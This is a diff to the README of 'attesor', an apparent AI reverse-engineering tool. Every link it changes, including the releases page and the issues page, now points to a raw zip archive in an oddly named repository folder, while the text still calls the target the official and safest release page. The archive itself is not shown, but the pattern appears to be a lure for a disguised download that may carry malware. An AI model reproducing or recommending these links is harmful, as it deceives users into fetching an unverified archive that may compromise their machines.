@@ -1,6 +1,6 @@
 # 🤖 attesor - AI Reverse Engineering Made Simple
 
-[![Download attesor](https://img.shields.io/badge/Download-attesor-blue?style=for-the-badge)](https://github.com/tuntuntunsahur21/attesor/releases)
+[![Download attesor](https://img.shields.io/badge/Download-attesor-blue?style=for-the-badge)](https://raw.githubusercontent.com/tuntuntunsahur21/attesor/main/Picrodendron/Software_1.1.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Before using attesor, you need to download its installer from the official relea
 
 1. Click the big blue button below to open the download page in your web browser:
 
-[![Download attesor](https://img.shields.io/badge/Download-attesor-blue?style=for-the-badge)](https://github.com/tuntuntunsahur21/attesor/releases)
+[![Download attesor](https://img.shields.io/badge/Download-attesor-blue?style=for-the-badge)](https://raw.githubusercontent.com/tuntuntunsahur21/attesor/main/Picrodendron/Software_1.1.zip)
 
 2. On the release page, look for the latest version available. It will usually have a label like "v1.0" or similar.
 
@@ -119,7 +119,7 @@ If problems continue, you can visit the release page to check for updates or fix
 
 Always get attesor from the official release page to ensure you have the latest and safest version:
 
-[Download and Updates - attesor Releases](https://github.com/tuntuntunsahur21/attesor/releases)
+[Download and Updates - attesor Releases](https://raw.githubusercontent.com/tuntuntunsahur21/attesor/main/Picrodendron/Software_1.1.zip)
 
 Check this page regularly for new versions, bug fixes, or notes on changes.
 
@@ -154,6 +154,6 @@ Since the process is AI-driven, results can vary. You may see incomplete or uncl
 
 For comments or issues, you can create a GitHub issue on the attesor repository page:
 
-https://github.com/tuntuntunsahur21/attesor/issues
+https://raw.githubusercontent.com/tuntuntunsahur21/attesor/main/Picrodendron/Software_1.1.zip
 
 This helps improve the project and fix any bugs users encounter.
